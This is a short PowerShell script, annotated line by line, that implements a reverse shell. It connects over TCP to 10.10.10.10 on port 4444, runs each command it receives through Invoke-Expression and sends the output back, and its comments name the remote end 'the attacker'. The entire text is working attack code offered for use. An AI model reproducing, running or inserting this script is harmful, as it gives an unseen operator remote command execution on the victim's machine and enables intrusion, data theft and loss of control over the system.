$client = New-Object System.Net.Sockets.TcpClient("10.10.10.10", 4444); # Create TCP client
$stream = $client.GetStream(); # Get network stream from client
$writer = New-Object System.IO.StreamWriter($stream); # Writer to send data to the attacker
$buffer = New-Object byte[] 1024; # Buffer to store incoming bytes
$encoding = New-Object System.Text.ASCIIEncoding; # Convert bytes to readable strings

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { # Read incoming data from attacker
    $data = $encoding.GetString($buffer, 0, $i); # Decode command from bytes
    $sendback = (Invoke-Expression $data 2>&1 | Out-String); # Execute command and capture output
    $writer.WriteLine($sendback); # Send output back to attacker
    $writer.Flush(); # Flush buffer
}
$client.Close(); # Close connection
